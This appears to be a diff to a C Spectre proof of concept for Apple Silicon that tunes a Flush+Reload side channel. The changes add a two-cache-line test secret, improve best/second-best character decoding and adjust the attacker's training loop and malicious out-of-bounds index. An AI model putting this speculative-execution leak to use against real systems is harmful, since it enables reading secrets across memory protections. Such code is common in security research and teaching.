@@ -24,8 +24,28 @@ static size_t   secret_line_idx = 0;
 
 static const char *secret1 = "The cake is a lie!";
 
+static const char big_secret[256] __attribute__((aligned(128))) = "1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111122222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222222";
+
+
+size_t page_size  = PAGE_SIZE;        // 16 KiB
+size_t line_size  = CACHE_LINE_SIZE;  // 128 B
+size_t secret_len = sizeof(secret_template) - 1; // without '\0'
+
+
 uint8_t* flush_buffer;
 
+
+
+// void init_big_secret(void) {
+//     for (int i = 0; i < 128; i++) {
+//         big_secret[i] = '1';   // first cache line
+//     }
+//     for (int i = 128; i < 256; i++) {
+//         big_secret[i] = '2';   // second cache line
+//     }
+//     // optional terminator if you want to treat it as a string
+//     // big_secret[255] = '\0';
+// }
 
 // Evict caches by reading through a large buffer bigger than LLC.
 // Tune EVICT_SIZE if your Mac has an unusually large LLC.
@@ -36,9 +56,7 @@ static unsigned char *evict_buf = NULL;
 
 static void init_secret_on_page(size_t line_idx, bool cross_boundary)
 {
-    size_t page_size  = PAGE_SIZE;        // 16 KiB
-    size_t line_size  = CACHE_LINE_SIZE;  // 128 B
-    size_t secret_len = sizeof(secret_template) - 1; // without '\0'
+    
 
     // mmap a single page, page-aligned
     secret_page = mmap(NULL, page_size,
@@ -63,7 +81,7 @@ static void init_secret_on_page(size_t line_idx, bool cross_boundary)
             exit(1);
         }
 
-        offset = line_idx * line_size;
+        offset = (line_idx * line_size);
 
         if (offset > max_offset) {
             fprintf(stderr,
@@ -186,23 +204,32 @@ uint32_t _time_maccess(void* ptr) {
 }
 
 // Find the most hit cacheline and safely decode its character
-void decode_flush_reload_state(char *c, uint64_t *hits, size_t cnt) {
+void decode_flush_reload_state(char *c, const uint64_t *hits, size_t cnt) {
     uint64_t most_hits = 0, scd_most_hits = 0;
     unsigned char raw_c = '\0', scd_raw_c = '\0';
-    for (size_t i = 0; i < cnt && i < SYMBOL_CNT; i++) {
-        if (most_hits < hits[i]) {
-            scd_most_hits = most_hits;
-            scd_raw_c = raw_c;
 
-            most_hits = hits[i];
-            raw_c = i;
+    for (size_t i = 0; i < cnt && i < SYMBOL_CNT; i++) {
+        uint64_t h = hits[i];
+
+        if (h > most_hits) {
+            // shift old best to second-best
+            scd_most_hits = most_hits;
+            scd_raw_c     = raw_c;
+
+            most_hits = h;
+            raw_c     = (unsigned char)i;
+        } else if (h > scd_most_hits) {
+            // new second-best, but not better than best
+            scd_most_hits = h;
+            scd_raw_c     = (unsigned char)i;
         }
     }
 
     *c = isprint(raw_c) ? raw_c : '?';
     char scd_c = isprint(scd_raw_c) ? scd_raw_c : '?';
-    printf("Best guess: '%c' (ASCII=%#4x, #hits=%3llu); "
-           "2nd best guess: '%c' (ASCII=%#4x, #hits=%3llu)\n",
+
+    printf("Best guess: '%c' (ASCII=%#4x, #hits=%" PRIu64 "); "
+           "2nd best guess: '%c' (ASCII=%#4x, #hits=%" PRIu64 ")\n",
            *c, raw_c, most_hits, scd_c, scd_raw_c, scd_most_hits);
 }
 // ====== End of helper functions ======
@@ -225,7 +252,7 @@ void naive_attacker() {
     find_fuzzy_eviction_set();
     printf("-----------------------------------------\n");
     uint64_t hits[SYMBOL_CNT] = { 0 };
-    char buf[100] = { '\0' };
+    char buf[256] = { '\0' };
 
     // Pages for Flush+Reload
     uint8_t *pages = mmap(NULL, PAGE_SIZE * SYMBOL_CNT, PROT_READ | PROT_WRITE,
@@ -238,8 +265,8 @@ void naive_attacker() {
     printf("SYMBOL_CNT: %d\n", SYMBOL_CNT);
     size_t stride = PAGE_SIZE;
 
-    const bool mmap_or_const = false;
-    const char *use_this = mmap_or_const ? secret1 : secret;
+    const bool mmap_or_const = true;
+    const char *use_this = mmap_or_const ? secret1 : big_secret;
     int32_t malicious_index = (int64_t)use_this - (int64_t)array;
     printf("Secret address: %p, Array address: %p\n", use_this, array);
     printf("The malicious index is %p-%p=%#x\n", use_this, array,
@@ -247,14 +274,15 @@ void naive_attacker() {
     printf("-----------------------------------------\n");
     uint64_t fuzzy_evict_got_it_wrong = 0;
     for (size_t c = 0; c < strlen(use_this); c++) {
-        for (size_t r = 0; r < 500; r++) {
-            for (size_t t = 0; t < 128; t++) {
+        for (size_t r = 0; r < 200; r++) {
+            for (size_t t = 0; t < 16; t++) {
                 bool is_attack = (t % 8 == 8 - 1);
                 int32_t index = cselect(malicious_index + c, 0, is_attack);
 
                 fuzzy_evict();
                 fence();
 
+                
                 naive_victim(pages, index, stride);
             }
 
@@ -286,6 +314,10 @@ int main(int argc, char **argv) {
     }
 
     init_secret_on_page(line_idx, false);
+    // init_big_secret();
+
+    // printf("%s\n", big_secret);
+
 
     printf(YELLOW_F "Using a naive Spectre PoC\n" RESET_C);
     naive_attacker();
